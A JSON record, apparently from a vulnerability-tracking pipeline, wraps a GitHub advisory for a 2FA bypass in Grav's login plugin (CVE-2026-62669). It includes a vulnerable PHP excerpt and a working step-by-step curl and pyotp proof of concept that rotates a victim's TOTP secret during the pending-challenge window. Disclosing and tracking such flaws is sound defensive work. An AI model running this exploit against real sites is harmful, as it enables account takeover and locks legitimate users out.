@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/15530416?v=4\", \"events_url\": \"https://api.github.com/users/nicl4ssic/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/nicl4ssic/followers\", \"following_url\": \"https://api.github.com/users/nicl4ssic/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/nicl4ssic/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/nicl4ssic\", \"id\": 15530416, \"login\": \"nicl4ssic\", \"node_id\": \"MDQ6VXNlcjE1NTMwNDE2\", \"organizations_url\": \"https://api.github.com/users/nicl4ssic/orgs\", \"received_events_url\": \"https://api.github.com/users/nicl4ssic/received_events\", \"repos_url\": \"https://api.github.com/users/nicl4ssic/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/nicl4ssic/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/nicl4ssic/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/nicl4ssic\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-62669\", \"cvss\": {\"score\": 7.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-287\", \"name\": \"Improper Authentication\"}], \"description\": \"### Summary\\nWhen 2FA is enabled on an account, submitting correct credentials authenticates the user but leaves them unauthorized pending TOTP verification. During this pending-challenge window, the `login.regenerate2FASecret` task which requires only `$user->exists()`, not `$user->authorized`  can be called without a CSRF nonce. It overwrites the victim's `twofa_secret` on disk with an attacker-chosen value, returns the new secret in the JSON response, and the attacker computes a valid TOTP code to complete the 2FA flow. The second factor is **reduced to password-only**. The exploit was confirmed live after enabling 2FA to a user.\\n\\n### Details\\nFour code locations in login plugin v3.8.10 enable the chain:\\n\\n**1. Session user set even with 2FA pending**  \\n`user/plugins/login/login.php` - `userLogin()` assigns `$session->user = $user` before TOTP verification completes. This makes `$this->grav['user']` point to the victim in the pending-challenge window.\\n\\n**2. `taskRegenerate2FASecret` - no authorization check**  \\n`user/plugins/login/classes/Controller.php`\\n\\n```php\\npublic function taskRegenerate2FASecret()\\n{\\n    $user = $this->grav['user'];\\n    if ($user->exists()) {                  // ← only checks exists(), NOT authorized()\\n        $secret = $twoFa->createSecret();\\n        $user->twofa_secret = $secret;      // overwrites victim's secret on disk\\n        $user->save();\\n        $json_response = [\\n            'status' => 'success',\\n            'image' => $image,\\n            'secret' => trim(preg_replace('|(\\\\w{4})|', '\\\\\\\\1 ', $secret)) // ← returned to attacker\\n        ];\\n    }\\n}\\n```\\n\\n**3. No CSRF nonce required**  \\n`user/plugins/login/login.php` - the task dispatch switch only validates `twofa_cancel` for nonce. `regenerate2FASecret` is not guarded, making it exploitable via a single unauthenticated GET request on the victim's session.\\n\\n### PoC\\n**Confirmed live** on this instance after enabling `plugins.login.twofa_enabled: true` and configuring TOTP on the `user` account.\\n\\n```bash\\n# Step 1: Password-only login (lands in 2FA-pending; keep session cookie)\\nLOGIN_PAGE=$(curl -s -c /tmp/2fa.jar \\\"http://127.0.0.1/grav/login\\\")\\nNONCE=$(echo \\\"$LOGIN_PAGE\\\" | grep -oP 'name=\\\"login-form-nonce\\\" value=\\\"\\\\K[^\\\"]+')\\ncurl -s -b /tmp/2fa.jar -c /tmp/2fa.jar -X POST \\\\\\n  \\\"http://127.0.0.1/grav/login\\\" \\\\\\n  -d \\\"username=user&password=Summer2024!&task=login.login&login-form-nonce=${NONCE}\\\"\\n\\n# Step 2: Regenerate the 2FA secret (NO nonce required)\\ncurl -s -b /tmp/2fa.jar \\\\\\n  \\\"http://127.0.0.1/grav/login/task:login.regenerate2FASecret\\\"\\n# {\\\"status\\\":\\\"success\\\",\\\"secret\\\":\\\"FS5P SYNP 24YH X3AM 3DP3 PADG RIPV B4K5\\\",...}\\n\\n# Step 3: Compute TOTP from the attacker-chosen secret\\npython3 -c \\\"import pyotp; print(pyotp.TOTP('FS5PSYNP24YHX3AM3DP3PADGRIPVB4K5').now())\\\"\\n# 152656\\n\\n# Step 4: Complete 2FA with attacker's TOTP code\\ncurl -s -L -b /tmp/2fa.jar -X POST \\\"http://127.0.0.1/grav/login\\\" \\\\\\n  -d \\\"task=login.twofa&2fa_code=152656\\\"\\n\\n# Step 5: Verify - fully authenticated as victim\\ncurl -s -b /tmp/2fa.jar \\\"http://127.0.0.1/grav/\\\" | grep -o 'Grav User\\\\|Logout'\\n# Grav User Logout\\n```\\n\\n### Impact\\nComplete 2FA bypass reducing the second factor to password-only. An attacker who knows the victim's password (via credential reuse, phishing, or cracking) can bypass TOTP-based 2FA by forcing a secret rotation during the pending-challenge window, computing a valid TOTP from the attacker-chosen secret, and completing the 2FA flow. The victim's legitimate TOTP secret is permanently overwritten on disk via `$user->save()`, locking them out of their own account.\\n\\nThe endpoint requires no CSRF token, making it exploitable via a single GET request. A logged-in victim visiting `http://target/login/task:login.regenerate2FASecret` on any attacker-controlled page would have their 2FA secret silently rotated.\", \"epss\": {\"percentage\": 0.00386, \"percentile\": 0.31581}, \"ghsa_id\": \"GHSA-7mgc-c7pq-3rr3\", \"github_reviewed_at\": \"2026-09-02T22:01:25Z\", \"html_url\": \"https://github.com/advisories/GHSA-7mgc-c7pq-3rr3\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7mgc-c7pq-3rr3\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-62669\"}], \"nvd_published_at\": \"2026-08-19T16:18:19Z\", \"published_at\": \"2026-09-02T22:01:25Z\", \"references\": [\"https://github.com/getgrav/grav/security/advisories/GHSA-7mgc-c7pq-3rr3\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-62669\", \"https://github.com/getgrav/grav-plugin-login/commit/5d1b722298cb947d8f434025d121b99152a2c630\", \"https://github.com/getgrav/grav-plugin-login/releases/tag/3.8.11\", \"https://github.com/getgrav/grav/releases/tag/2.0.4\", \"https://github.com/advisories/GHSA-7mgc-c7pq-3rr3\"], \"repository_advisory_url\": \"https://api.github.com/repos/getgrav/grav/security-advisories/GHSA-7mgc-c7pq-3rr3\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/getgrav/grav\", \"summary\": \"Grav: 2FA Bypass via 'login.regenerate2FASecret' - Secret Rotation During Pending Challenge\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-02T22:01:26Z\", \"url\": \"https://api.github.com/advisories/GHSA-7mgc-c7pq-3rr3\", \"vulnerabilities\": [{\"first_patched_version\": \"2.0.4\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"getgrav/grav\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.0.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7mgc-c7pq-3rr3",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "getgrav/grav: < 2.0.4"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-62669"
+    ],
+    "cvss_score": 7.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "getgrav/grav"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-03T19:12:46.478439Z",
+  "provenance": {
+    "content_sha256": "d64c0774075d7a294215da9d55c01bca2777c87328af2c97e6a264e32dce9f4c",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-02T22:01:25Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7mgc-c7pq-3rr3",
+  "status": "active",
+  "title": "Grav: 2FA Bypass via 'login.regenerate2FASecret' - Secret Rotation During Pending Challenge",
+  "updated_at": "2026-09-02T22:01:26Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7mgc-c7pq-3rr3"
+}
